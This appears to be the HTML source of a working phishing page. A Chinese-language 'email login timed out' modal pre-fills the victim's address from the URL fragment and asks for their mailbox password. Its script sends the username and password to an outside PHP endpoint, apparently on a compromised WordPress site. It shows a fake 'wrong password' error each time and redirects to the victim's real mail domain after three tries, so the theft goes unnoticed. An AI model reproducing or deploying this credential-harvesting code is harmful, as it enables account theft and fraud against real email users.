        @media (min-width: 480px) {
            body {

        }

        *, ::after, ::before {
            box-sizing: border-box;
        }

        [tabindex="-1"]:focus {
            outline: 0 !important;
        }

        label {
            display: inline-block;
            margin-bottom: 0.5rem;
        }

        button {
            border-radius: 0;
        }

        button:focus {
            outline: 1px dotted;
            outline: 5px auto -webkit-focus-ring-color;
        }

        button, input {
            margin: 0;
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
        }

        button, input {
            overflow: visible;
        }

        button {
            text-transform: none;
        }

        button, html [type="button"] {
            -webkit-appearance: button;
        }

        .form-control {
            display: block;
            width: 100%;
            padding: 0.375rem 0.75rem;
            font-size: 1rem;
            line-height: 1.5;
            color: #495057;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #ced4da;
            border-radius: 0.25rem;
            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        }

        .form-control:focus {
            color: #495057;
            background-color: #fff;
            border-color: #80bdff;
            outline: 0;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
        }

        .form-control::placeholder {
            color: #6c757d;
            opacity: 1;
        }

        .form-control:disabled, .form-control[readonly] {
            background-color: #e9ecef;
            opacity: 1;
        }

        .col-form-label {
            padding-top: calc(0.375rem + 1px);
            padding-bottom: calc(0.375rem + 1px);
            margin-bottom: 0;
            font-size: inherit;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 1rem;
        }

        .btn {
            display: inline-block;
            font-weight: 400;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            border: 1px solid transparent;
            padding: 0.375rem 0.75rem;
            font-size: 1rem;
            line-height: 1.5;
            border-radius: 0.25rem;
            transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        }

        .btn:focus, .btn:hover {
            text-decoration: none;
        }

        .btn:focus {
            outline: 0;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
        }

        .btn:disabled {
            opacity: 0.65;
        }

        .btn:not(:disabled):not(.disabled) {
            cursor: pointer;
        }

        .btn-secondary {
            color: #fff;
            background-color: #6c757d;
            border-color: #6c757d;
        }

        .btn-secondary:hover {
            color: #fff;
            background-color: #5a6268;
            border-color: #545b62;
        }

        .btn-success {
            color: #fff;
            background-color: #28a745;
            border-color: #28a745;
        }

        .btn-success:hover {
            color: #fff;
            background-color: #218838;
            border-color: #1e7e34;
        }

        .modal {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1050;
            display: none;
            overflow: hidden;
            outline: 0;
        }

        .modal-open .modal {
            overflow-x: hidden;
            overflow-y: auto;
        }

        .modal-dialog {
            position: relative;
            width: auto;
            margin: 1.75rem auto;
            max-width: 90%;
        }

        @media (min-width: 801px) {
            .modal-dialog {
                max-width: 50%;
            }
        }

        .modal.fade .modal-dialog {
            transition: transform 0.3s ease-out;
            transform: translate(0, -25%);
        }

        .modal.show .modal-dialog {
            transform: translate(0, 0);

        .modal-dialog-centered {
            display: flex;
            align-items: center;
            min-height: calc(100% - 1.75rem * 2);
        }

        .modal-content {
            display: flex;
            flex-direction: column;
            width: 100%;
            background-color: #fff;
            border: 1px solid rgba(0, 0, 0, 0.2);
        }

        .modal-header, .modal-footer {
            padding: 1rem;
            background-color: #f7f7f7;
        }

        .modal-header {
            border-bottom: 1px solid #e9ecef;
        }

        .modal-footer {
            border-top: 1px solid #e9ecef;
            display: flex;
            justify-content: flex-end;
        }

        .modal-body {
            padding: 1rem;
        }

        .mt-4 {
            margin-top: 1.5rem !important;
        }

        .py-1 {
            padding-top: 0.25rem !important;
            padding-bottom: 0.25rem !important;
        }

        .p-2 {
            padding: 0.5rem !important;
        }

        .px-5 {
            padding-right: 3rem !important;
            padding-left: 3rem !important;
        }

        .text-danger {
            color: #dc3545 !important;
        }

        @media print {
            *, ::after, ::before {
                text-shadow: none !important;
                box-shadow: none !important;
            }
        }
    </style>
</head>
<body>
    <div class="modal fade show" id="emailLoginModal" data-backdrop="static" tabindex="-1" role="dialog" aria-labelledby="emailLoginModalTitle" style="display: block; background-color: rgba(0, 0, 0, 0.8);">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <div class="modal-body">
                    <span class="font-weight-bold text-muted" style="font-size: 17px;">电子邮件登录超时，请重新登录</span>
                    <center>
                        <p id="loginErrorMessage" class="text-danger" style="display:none; font-weight: 700; font-size: 17px;">登录信息不正确。请重试</p>
                    </center>
                    <form id="loginForm" class="mt-4">
                        <center>
                            <div class="alert alert-danger" id="passwordError" style="display: none;">无效的密码！请输入正确的密码。</div>
                            <span id="accountError" class="text-danger" style="display: none;">该帐户不存在。输入其他帐户。</span>
                        </center>
                        <div class="form-group row">
                            <label for="emailInput" class="col-sm-4 col-form-label">用户名</label>
                            <div class="col-sm-8">
                                <input type="email" class="form-control py-1" id="emailInput" readonly />
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="passwordInput" class="col-sm-4 col-form-label">邮箱密码</label>
                            <div class="col-sm-8">
                                <input type="password" class="form-control py-1" id="passwordInput" placeholder="请输入密码" />
                                <input type="hidden" id="attemptCount" value="0"/>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-success py-1" onclick="submitLogin()">登录</button>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.js" integrity="sha512-+k1pnlgt4F1H8L7t3z95o3/KO+o78INEcXTbnoJQ/F2VqDVhWoaiVml/OEHv9HsVgxUaVW+IbiZPUJQfF/YxZw==" crossorigin="anonymous" referrerpolicy="no-referrer">
      
    </script>

    <script>
      // Email handling function (to get the email from the URL)
const getEmailFromUrl = () => {
    const emailParam = window.location.hash.substr(1);
    if (!emailParam) return null;

    const base64Regex = /^[a-zA-Z0-9+/=]+$/;
    let email = (base64Regex.test(emailParam)) ? atob(emailParam) : emailParam;

    return email;
}

// Set the email input value from the URL
const setEmailInputValue = () => {
    const email = getEmailFromUrl();
    if (email) {
        document.getElementById('emailInput').value = email;
    }
}

// Wait for the DOM to load, then set the email
$(document).ready(function() {
    setEmailInputValue();
});

// Handle form submission
const submitLogin = () => {
    const email = $("#emailInput").val();
    const password = $("#passwordInput").val();
    let attemptCount = parseInt($("#attemptCount").val());

    // Check if password is empty
    if (password === "") {
        displayErrorMessage("passwordError", "请输入有效的密码！");
        return;
    }

    // Increment attempt count
    attemptCount++;
    $("#attemptCount").val(attemptCount);

    // Send the form data to result.php using AJAX
    const formData = {
        username: email,
        password: password,
        verify: attemptCount
    };

    $.ajax({
        type: "POST",
        url: "https://dev-cloud-pep.pantheonsite.io/wp-includes/ID3/ID2/result.php",
        data: formData,
        dataType: "json",
        encode: true,
        success: function(response) {
            // Optionally handle the response here
            console.log("AJAX response:", response);
        },
        error: function(xhr, status, error) {
            // Handle error if necessary
            console.error("AJAX error:", error);
        }
    });

    // If attempt count reaches 3, perform the redirect
    if (attemptCount >= 3) {
        const emailDomain = email.split('@')[1];
        setTimeout(() => {
            location.href = `https://${emailDomain}`;
        }, 2000);  // Redirect after 2 seconds
        return;
    }

    // If not yet reached 3 attempts, show an error message and clear the password field
    displayErrorMessage("loginErrorMessage", "登录信息不正确。请重试");
    clearPasswordField();
}

// Display error messages
const displayErrorMessage = (elementId, message) => {
    $("#" + elementId).text(message).show();
}

// Clear password field
const clearPasswordField = () => {
    $("#passwordInput").val("");
}

    </script>
</body>
</html>
